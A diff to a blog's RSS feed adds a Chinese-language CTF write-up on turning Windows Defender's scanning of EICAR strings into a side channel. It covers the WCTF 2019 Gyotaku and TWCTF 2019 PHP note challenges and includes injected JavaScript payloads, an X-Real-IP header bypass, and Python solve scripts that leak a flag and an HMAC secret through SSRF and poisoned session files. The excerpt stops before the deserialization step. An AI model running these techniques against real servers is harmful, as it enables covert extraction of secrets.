@@ -5,8 +5,626 @@
     <description>Recent content in syang&#39;s blog on syang&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>zh-cn</language>
-    <lastBuildDate>Wed, 04 Sep 2019 09:20:22 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 05 Sep 2019 13:25:41 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Windows Defender 侧信道攻击</title>
+      <link>https://syang-ng.github.io/2019/09/side-channel-by-windows-defender/</link>
+      <pubDate>Thu, 05 Sep 2019 13:25:41 +0800</pubDate>
+      
+      <guid>https://syang-ng.github.io/2019/09/side-channel-by-windows-defender/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;利用 Windows Defender 进行侧信道攻击是 TokyoWesterns 在 WCTF 2019 上提出来的一种新的思路，与之相关的是 WCTF 2019 的题目 Gyotaku 和 TWCTF2019 的 PHP note。&lt;/p&gt;
+
+&lt;p&gt;##Windows Defender&lt;/p&gt;
+
+&lt;p&gt;根据 icchy 在分享环节 ppt 的总结，Windows Defender 会表现出如下特征：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;As we investigated:
+
+&lt;ol&gt;
+&lt;li&gt;check the content of the file whether malicious data included&lt;/li&gt;
+&lt;li&gt;change permission to prevent user from accessing&lt;/li&gt;
+&lt;li&gt;Replace malicious part with null bytes&lt;/li&gt;
+&lt;li&gt;(delete entire file)&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;li&gt;In step 2:
+
+&lt;ul&gt;
+&lt;li&gt;the file obtained by SYSTEM&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;user cannot open the file&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;而只要找到一种合适的方式，我们可以在某种程度上滥用 Windows Defender 的这种特性，进而进行侧信道攻击。&lt;/p&gt;
+
+&lt;h3 id=&#34;如何触发-windows-defender&#34;&gt;如何触发 Windows Defender&lt;/h3&gt;
+
+&lt;p&gt;很简单，利用 EICAR 测试文件即可，关于什么是 EICAR 测试文件，以下是官方简介：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;欧洲计算机防病毒研究所 (EICAR) 开发了一种测试病毒，可用于测试您的防病毒设备。此脚本是一个惰性文本文件。二进制特征码包含在多数防病毒产品供应商的病毒码文件中。它本质上不是病毒，并且不包含任何程序代码。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;将下面内容写入一个 eicar.com 文件，然后尝试访问：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;尝试读取该文件，可以发现触发了 Windows Defender 的拦截：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS C:\Users\syang\Desktop&amp;gt; type .\eicar.com
+type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
+所在位置 行:1 字符: 1
++ type .\eicar.com
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\eicar.com:String) [Get-Content], IOException
+    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand%
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;jscript-engine-in-mpengine-dll&#34;&gt;JScript engine in mpengine.dll&lt;/h3&gt;
+
+&lt;p&gt;作为 Windows Defender 最核心的动态链接库，mpengine.dll 实现了对多种文件的检测功能，其中就包括了一个 JS 引擎，该引擎对 JS 相关的内容进行分析，比如 eval 的参数，这里的 JS 脚本包括 HTML 中的 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签中的内容。这里贴一份 &lt;a href=&#34;https://n0b0dycn.me/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;n0b0dy&lt;/a&gt; 师傅测试成功的 payload，可以看到尝试访问时会触发 Windows Defender：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;quot;;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;PS C:\Users\syang\Desktop&amp;gt; type .\test.html
+type : 无法成功完成操作，因为文件包含病毒或潜在的垃圾软件。
+所在位置 行:1 字符: 1
++ type .\test.html
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ReadError: (C:\Users\syang\Desktop\test.html:String) [Get-Content], IOException
+    + FullyQualifiedErrorId : GetContentReaderIOError,Microsoft.PowerShell.Commands.GetContentCommand
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但这里有个值得困惑的点是本人使用了类似的 payload 却不会触发 Windows Defender 的预警：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+eval(&amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&amp;quot;);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;看到 n0b0dy 师傅也提了一句：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;但是如果不加第二行&lt;code&gt;var body = document.body.innerHTML;&lt;/code&gt;的话，则无法触发Windows Defender。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;大概只能归因于 Windows Defender 的奇怪特性。另外根据分享的 ppt，可以发现该引擎还有如下几个特性：&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;if statement will never be evaluated
+
+&lt;ul&gt;
+&lt;li&gt;if (true) {eval(&amp;ldquo;EICA&amp;rdquo; + &amp;ldquo;R&amp;rdquo;)} -&amp;gt; not detected&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;object accessing&lt;/strong&gt; will help you: {0: &amp;ldquo;a&amp;rdquo;, 1: &amp;ldquo;b&amp;rdquo;, …}[input]&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;parser stops on null byte
+
+&lt;ul&gt;
+&lt;li&gt;eval(&amp;ldquo;EICA&amp;rdquo; + &amp;ldquo;[NULL]&amp;ldquo;) -&amp;gt; syntax error&lt;/li&gt;
+&lt;li&gt;parser will not stop no null byte (in HTML document)&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;所以，利用以上特性和 JavaScript 能访问页面元素的特性，可以进行侧信道攻击，比如以下代码会触发 Windows Defender 的预警：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;quot;+n;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;*&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;而以下内容不会：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+var body = document.body.innerHTML;
+var n = body[0];
+var mal = &amp;quot;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;quot;+n;
+eval(mal);
+&amp;lt;/script&amp;gt;
+&amp;lt;body&amp;gt;a&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由此，赞美 TokyoWesterns，一个全新的侧信道思路出现了！&lt;/p&gt;
+
+&lt;h2 id=&#34;gyotaku&#34;&gt;Gyotaku&lt;/h2&gt;
+
+&lt;p&gt;题目 repo：&lt;a href=&#34;https://github.com/icchy/wctf2019-gtf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;WCTF2019: Gyotaku The Flag&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;非预期&#34;&gt;非预期&lt;/h3&gt;
+
+&lt;p&gt;题目本身是基于 echo 框架的，阅读题目源码，可以发现在 &lt;code&gt;main.go&lt;/code&gt; 中直接定义了获得了 flag 的接口： &lt;code&gt;e.GET(&amp;quot;/flag&amp;quot;, FlagHandler, InternalRequiredMiddleware)&lt;/code&gt; ，所以只要满足 &lt;code&gt;InternalRequiredMiddleware&lt;/code&gt; 的验证，即可获得 flag。&lt;/p&gt;
+
+&lt;p&gt;阅读相应源码，可以发现需要满足访问 ip 为 127.0.0.1 这个条件即可通过验证：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func InternalRequiredMiddleware(next echo.HandlerFunc) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		ip := net.ParseIP(c.RealIP())
+		localip := net.ParseIP(&amp;quot;127.0.0.1&amp;quot;)
+		if !ip.Equal(localip) {
+			return echo.NewHTTPError(http.StatusForbidden)
+		}
+		return next(c)
+	}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;而根据 echo 对 &lt;code&gt;RealIP&lt;/code&gt;  的实现，这里可以使用 &lt;code&gt;X-Real-IP: 127.0.0.l&lt;/code&gt; 欺骗进而绕过：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (c *context) RealIP() string {
+	if ip := c.request.Header.Get(HeaderXForwardedFor); ip != &amp;quot;&amp;quot; {
+		return strings.Split(ip, &amp;quot;, &amp;quot;)[0]
+	}
+	if ip := c.request.Header.Get(HeaderXRealIP); ip != &amp;quot;&amp;quot; {
+		return ip
+	}
+	ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)
+	return ra
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;充分说明了出题后验题的重要性（）&lt;/p&gt;
+
+&lt;h2 id=&#34;预期解&#34;&gt;预期解&lt;/h2&gt;
+
+&lt;p&gt;理论上的预期解，无需访问 &lt;code&gt;/flag&lt;/code&gt; ，而是使用 Windows Defender 的特性进行侧信道，进而泄露出 flag。&lt;/p&gt;
+
+&lt;p&gt;首先回到题目本身，来看到除了直接访问 &lt;code&gt;/flag&lt;/code&gt; 路径外，是否存在着第二种方式可以获得 flag。很容易就注意到 &lt;code&gt;e.POST(&amp;quot;/gyotaku&amp;quot;, GyotakuHandler(dbconn), LoginRequiredMiddleware)&lt;/code&gt;，继续跟进 &lt;code&gt;GyotakuHandler&lt;/code&gt; 函数，可以发现该函数会根据传入的参数 &lt;code&gt;url&lt;/code&gt; 进行请求相应资源，然后保存到本地。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func GyotakuHandler(db *DBConn) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		sess, _ := session.Get(SessionName, c)
+		username := sess.Values[&amp;quot;username&amp;quot;].(string)
+
+		url := c.FormValue(&amp;quot;url&amp;quot;)
+
+		// generate gyotaku id
+		gid := fmt.Sprintf(&amp;quot;%x&amp;quot;, sha256.Sum256([]byte(url)))
+
+		_, err := os.Stat(path.Join(GyotakuDir, gid))
+		if !os.IsNotExist(err) {
+			return c.JSON(http.StatusConflict, &amp;quot;this gyotaku has already been taken&amp;quot;)
+		}
+
+		resp, err := http.Get(url)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+
+		// save gyotaku
+		gyotakudata := &amp;amp;GyotakuData{
+			URL:      url,
+			Data:     string(body),
+			UserName: username,
+		}
+
+		buf := bytes.NewBuffer(nil)
+		err = gob.NewEncoder(buf).Encode(gyotakudata)
+		if err != nil {
+			return err
+		}
+		err = ioutil.WriteFile(path.Join(GyotakuDir, gid), buf.Bytes(), 0644)
+		if err != nil {
+			return err
+		}
+
+		err = db.AddGyotakuList(username, gid)
+		if err != nil {
+			return err
+		}
+
+		return c.JSON(http.StatusOK, gid)
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但跟进 &lt;code&gt;GyotakuViewHandler&lt;/code&gt; 可以看到题目本身没有实现查看的功能，所以无法查看保存到本地的文件内容：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func GyotakuViewHandler(db *DBConn) echo.HandlerFunc {
+	return func(c echo.Context) error {
+		// sess, _ := session.Get(SessionName, c)
+		// username := sess.Values[&amp;quot;username&amp;quot;].(string)
+		gid := c.Param(&amp;quot;gid&amp;quot;)
+
+		_, err := os.Stat(path.Join(GyotakuDir, gid))
+		if os.IsNotExist(err) {
+			return c.JSON(http.StatusNotFound, &amp;quot;no such gyotaku&amp;quot;)
+		}
+
+		_, err = ioutil.ReadFile(path.Join(GyotakuDir, gid))
+		if err != nil {
+			return err
+		}
+
+		return c.JSON(http.StatusNotImplemented, &amp;quot;sorry but I couldn&#39;t make it by the submission deadline :P&amp;quot;)
+
+		// var gyotakudata GyotakuData
+		// buf := bytes.NewBuffer(data)
+		// err = gob.NewDecoder(buf).Decode(&amp;amp;gyotakudata)
+		// if err != nil {
+		// 	return err
+		// }
+
+		// if username != gyotakudata.UserName {
+		// 	return c.JSON(http.StatusForbidden, &amp;quot;this is not your gyotaku&amp;quot;)
+		// }
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;至此，可以总结出以下几个要点：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;由于是 SSRF，所以能直接请求到 &lt;code&gt;/flag&lt;/code&gt; 的内容&lt;/li&gt;
+&lt;li&gt;请求到的内容会保存到本地，保存的结构为 &lt;code&gt;GyotakuData{URL: url, Data: string(body), UserName: username}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;保存到本地的内容会被读取，但无法回显给用户&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;综合一下我们的思路，这意味着我们可能需要一种侧信道的方式来猜解 flag。&lt;/p&gt;
+
+&lt;p&gt;回顾一下可以控制的变量，&lt;code&gt;url&lt;/code&gt; 和 &lt;code&gt;username&lt;/code&gt;，如果只要我们构造出 &lt;code&gt;url=/flag?a=&amp;lt;scirpt&amp;gt;code&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&lt;/code&gt;，&lt;code&gt;username=&amp;lt;/body&amp;gt;&lt;/code&gt;，就可以构造出一个包含 flag 的文件，而该文件在被读取时可以触发 可以被 Windows Defender 的预警，利用一定的 JavaScript 代码，我们可以对 flag 进行猜解。&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;JavaScript
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$idx&lt;/code&gt; and &lt;code&gt;$c&lt;/code&gt; would be iterated&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;&amp;gt; var body = document.body.innerHTML;
+&amp;gt; var mal = &amp;quot;EICA&amp;quot;;
+&amp;gt; var n = body[$idx].charCodeAt(0);
+&amp;gt; mal = mal + String.fromCharCode(n^$c);
+&amp;gt; eval($c)
+&amp;gt; ```
+&amp;gt;
+&amp;gt; - Windows Defender get angry if `$c` is appropriate
+
+### solve
+
+这里是出题人给的 solve.py，利用二分搜索加快了猜解的进度：
+
+```python
+import requests
+
+URL = &amp;quot;http://192.168.122.78&amp;quot; # changeme
+
+def randstr(n=8):
+    import random
+    import string
+    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
+    return &#39;&#39;.join([random.choice(chars) for _ in range(n)])
+
+def trigger(c, idx, sess):
+    import string
+    prefix = randstr()
+    p = prefix + &#39;&#39;&#39;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&#39;&#39;&#39;
+    p = string.Template(p).substitute({&#39;idx&#39;: idx, &#39;c&#39;: c})
+    req = sess.post(URL + &#39;/gyotaku&#39;, data={&#39;url&#39;: &#39;http://127.0.0.1/flag?a=&#39; + p})
+    return req.json()
+
+def leak(idx, sess):
+    l, h = 0, 0x100
+    while h - l &amp;gt; 1:
+        m = (h + l) // 2
+        gid = trigger(m, idx, sess)
+        if sess.get(URL + &#39;/gyotaku/&#39; + gid).status_code == 500:
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+sess = requests.session()
+sess.post(URL + &#39;/login&#39;, data={&#39;username&#39;: &#39;&amp;lt;/body&amp;gt;&#39;+randstr(), &#39;password&#39;: randstr()})
+
+data = &#39;&#39;
+for i in range(30):
+    data += leak(i, sess)
+    print(data)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;php-note&#34;&gt;PHP note&lt;/h2&gt;
+
+&lt;p&gt;题目直接给出了源码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php
+include &#39;config.php&#39;;
+
+class Note {
+    public function __construct($admin) {
+        $this-&amp;gt;notes = array();
+        $this-&amp;gt;isadmin = $admin;
+    }
+
+    public function addnote($title, $body) {
+        array_push($this-&amp;gt;notes, [$title, $body]);
+    }
+
+    public function getnotes() {
+        return $this-&amp;gt;notes;
+    }
+
+    public function getflag() {
+        if ($this-&amp;gt;isadmin === true) {
+            echo FLAG;
+        }
+    }
+}
+
+function verify($data, $hmac) {
+    $secret = $_SESSION[&#39;secret&#39;];
+    if (empty($secret)) return false;
+    return hash_equals(hash_hmac(&#39;sha256&#39;, $data, $secret), $hmac);
+}
+
+function hmac($data) {
+    $secret = $_SESSION[&#39;secret&#39;];
+    if (empty($data) || empty($secret)) return false;
+    return hash_hmac(&#39;sha256&#39;, $data, $secret);
+}
+
+function gen_secret($seed) {
+    return md5(SALT . $seed . PEPPER);
+}
+
+function is_login() {
+    return !empty($_SESSION[&#39;secret&#39;]);
+}
+
+function redirect($action) {
+    header(&amp;quot;Location: /?action=$action&amp;quot;);
+    exit();
+}
+
+$method = $_SERVER[&#39;REQUEST_METHOD&#39;];
+$action = $_GET[&#39;action&#39;];
+
+if (!in_array($action, [&#39;index&#39;, &#39;login&#39;, &#39;logout&#39;, &#39;post&#39;, &#39;source&#39;, &#39;getflag&#39;])) {
+    redirect(&#39;index&#39;);
+}
+
+if ($action === &#39;source&#39;) {
+    highlight_file(__FILE__);
+    exit();
+}
+
+
+session_start();
+
+if (is_login()) {
+    $realname = $_SESSION[&#39;realname&#39;];
+    $nickname = $_SESSION[&#39;nickname&#39;];
+    
+    $note = verify($_COOKIE[&#39;note&#39;], $_COOKIE[&#39;hmac&#39;])
+            ? unserialize(base64_decode($_COOKIE[&#39;note&#39;]))
+            : new Note(false);
+}
+
+if ($action === &#39;login&#39;) {
+    if ($method === &#39;POST&#39;) {
+        $nickname = (string)$_POST[&#39;nickname&#39;];
+        $realname = (string)$_POST[&#39;realname&#39;];
+
+        if (empty($realname) || strlen($realname) &amp;lt; 8) {
+            die(&#39;invalid name&#39;);
+        }
+
+        $_SESSION[&#39;realname&#39;] = $realname;
+        if (!empty($nickname)) {
+            $_SESSION[&#39;nickname&#39;] = $nickname;
+        }
+        $_SESSION[&#39;secret&#39;] = gen_secret($nickname);
+    }
+    redirect(&#39;index&#39;);
+}
+
+if ($action === &#39;logout&#39;) {
+    session_destroy();
+    redirect(&#39;index&#39;);
+}
+
+if ($action === &#39;post&#39;) {
+    if ($method === &#39;POST&#39;) {
+        $title = (string)$_POST[&#39;title&#39;];
+        $body = (string)$_POST[&#39;body&#39;];
+        $note-&amp;gt;addnote($title, $body);
+        $data = base64_encode(serialize($note));
+        setcookie(&#39;note&#39;, (string)$data);
+        setcookie(&#39;hmac&#39;, (string)hmac($data));
+    }
+    redirect(&#39;index&#39;);
+}
+
+if ($action === &#39;getflag&#39;) {
+    $note-&amp;gt;getflag();
+}
+
+?&amp;gt;
+&amp;lt;!doctype html&amp;gt;
+&amp;lt;html&amp;gt;
+    &amp;lt;head&amp;gt;
+        &amp;lt;title&amp;gt;PHP note&amp;lt;/title&amp;gt;
+    &amp;lt;/head&amp;gt;
+    &amp;lt;style&amp;gt;
+        textarea {
+            resize: none;
+            width: 300px;
+            height: 200px;
+        }
+    &amp;lt;/style&amp;gt;
+    &amp;lt;body&amp;gt;
+        &amp;lt;?php
+        if (!is_login()) {
+            $realname = htmlspecialchars($realname);
+            $nickname = htmlspecialchars($nickname);
+        ?&amp;gt;
+        &amp;lt;form action=&amp;quot;/?action=login&amp;quot; method=&amp;quot;post&amp;quot; id=&amp;quot;login&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;firstname&amp;quot; placeholder=&amp;quot;First Name&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;lastname&amp;quot; placeholder=&amp;quot;Last Name&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot; id=&amp;quot;nickname&amp;quot; placeholder=&amp;quot;nickname&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;realname&amp;quot; id=&amp;quot;realname&amp;quot;&amp;gt;
+            &amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;Login&amp;lt;/button&amp;gt;
+        &amp;lt;/form&amp;gt;
+        &amp;lt;?php
+        } else {
+        ?&amp;gt;
+        &amp;lt;h1&amp;gt;Welcome, &amp;lt;?=$realname?&amp;gt;&amp;lt;?= !empty($nickname) ? &amp;quot; ($nickname)&amp;quot; : &amp;quot;&amp;quot; ?&amp;gt;&amp;lt;/h1&amp;gt;
+        &amp;lt;a href=&amp;quot;/?action=logout&amp;quot;&amp;gt;logout&amp;lt;/a&amp;gt;
+        &amp;lt;!-- &amp;lt;a href=&amp;quot;/?action=source&amp;quot;&amp;gt;source&amp;lt;/a&amp;gt; --&amp;gt;
+        &amp;lt;br/&amp;gt;
+        &amp;lt;br/&amp;gt;
+        &amp;lt;?php
+            foreach($note-&amp;gt;getnotes() as $k =&amp;gt; $v) {
+                list($title, $body) = $v;
+                $title = htmlspecialchars($title);
+                $body = htmlspecialchars($body);
+        ?&amp;gt;
+        &amp;lt;h2&amp;gt;&amp;lt;?=$title?&amp;gt;&amp;lt;/h2&amp;gt;
+        &amp;lt;p&amp;gt;&amp;lt;?=$body?&amp;gt;&amp;lt;/p&amp;gt;
+        &amp;lt;?php
+            }
+        ?&amp;gt;
+        &amp;lt;form action=&amp;quot;/?action=post&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
+            &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;title&amp;quot; placeholder=&amp;quot;title&amp;quot;&amp;gt;
+            &amp;lt;br&amp;gt;
+            &amp;lt;textarea name=&amp;quot;body&amp;quot; placeholder=&amp;quot;body&amp;quot;&amp;gt;&amp;lt;/textarea&amp;gt;
+            &amp;lt;button type=&amp;quot;submit&amp;quot;&amp;gt;Post&amp;lt;/button&amp;gt;
+        &amp;lt;/form&amp;gt;
+        &amp;lt;?php
+        }
+        ?&amp;gt;
+        &amp;lt;?php
+        ?&amp;gt;
+        &amp;lt;script&amp;gt;
+            document.querySelector(&amp;quot;form#login&amp;quot;).addEventListener(&#39;submit&#39;, (e) =&amp;gt; {
+                const nickname = document.querySelector(&amp;quot;input#nickname&amp;quot;)
+                const firstname = document.querySelector(&amp;quot;input#firstname&amp;quot;)
+                const lastname = document.querySelector(&amp;quot;input#lastname&amp;quot;)
+                document.querySelector(&amp;quot;input#realname&amp;quot;).value = `${firstname.value} ${lastname.value}`
+                if (nickname.value.length == 0 &amp;amp;&amp;amp; firstname.value.length &amp;gt; 0 &amp;amp;&amp;amp; lastname.value.length &amp;gt; 0) {
+                    nickname.value = firstname.value.toLowerCase()[0] + lastname.value.toLowerCase()
+                }
+            })
+        &amp;lt;/script&amp;gt;
+    &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;可以看到是一个很正常的反序列化的题目，但由于不知道 &lt;code&gt;$_SESSION[&#39;secret&#39;]&lt;/code&gt; 的值，构造后的反序列化对象无法通过 &lt;code&gt;hmac&lt;/code&gt; 验证。因此，解题的第一步需要猜解出 &lt;code&gt;$_SESSION[&#39;secret&#39;]&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;查看 HTTP 请求的 header，可以发现相应的 server 是一台 Windows：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Content-Length: 27171
+Content-Type: text/html; charset=UTF-8
+Date: Thu, 05 Sep 2019 14:16:31 GMT
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.3.9
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么很自然的考虑利用 Windows Defender 来进行侧信道。考虑到 PHP 的 session 本质上也是存储在 server 上的文件，那么可以利用创建一个恶意 session 文件的方式来触发 Windows Defender。&lt;/p&gt;
+
+&lt;p&gt;注意到由于复制顺序的问题，我们需要两次调用 &lt;code&gt;/login&lt;/code&gt; 来构造一个符合 HTML 格式的 session 文件，以下是在 Linux 上的模拟，不要在意真题环境是 Windows 这种事情（逃：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
+realname|s:209:&amp;quot;--!&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{0:&#39;*&#39;}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;;secret|s:32:&amp;quot;8b9a527ff677cb223afa87dad7c9e6f8&amp;quot;;
+$ sudo cat sess_i4m4pdr67l20ar8i6777av24s7
+realname|s:209:&amp;quot;--!&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{0:&#39;*&#39;}[Math.min(0,n)])};f(document.body.innerHTML[2].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;;secret|s:32:&amp;quot;121cc233a4700baca86ab6a6fa3f2d50&amp;quot;;nickname|s:8:&amp;quot;1&amp;lt;/body&amp;gt;&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;修改脚本：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import random
+import string
+import requests
+
+URL = &amp;quot;http://phpnote.chal.ctf.westerns.tokyo/?action={}&amp;quot;
+
+def trigger(c, idx):
+    sess = requests.session()
+    payload = &#39;&#39;&#39;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;f=function(n){eval(&#39;X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&#39;+{${c}:&#39;*&#39;}[Math.min(${c},n)])};f(document.body.innerHTML[${idx}].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&#39;&#39;&#39;
+    payload = string.Template(payload).substitute({&#39;idx&#39;: idx, &#39;c&#39;: c})
+    sess.post(URL.format(&#39;login&#39;), data={
+        &#39;realname&#39;: payload 
+    })
+    sess.post(URL.format(&#39;login&#39;), data={
+        &#39;nickname&#39;: &#39;1&amp;lt;/body&amp;gt;&#39;,
+        &#39;realname&#39;: payload 
+    })
+    res = sess.get(URL.format(&#39;index&#39;))
+    return &#39;Login&#39; in res.text
+
+def leak(idx):
+    l, h = 0, 0x100
+    while h - l &amp;gt; 1:
+        m = (h + l) // 2
+        if trigger(m, idx):
+            l = m
+        else:
+            h = m
+    return chr(l)
+
+data = &#39;&#39;
+for i in range(60):
+    data += leak(i)
+    print(data)
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;泄露出 secret 后构造反序列化对象：&lt;/p&gt;
+
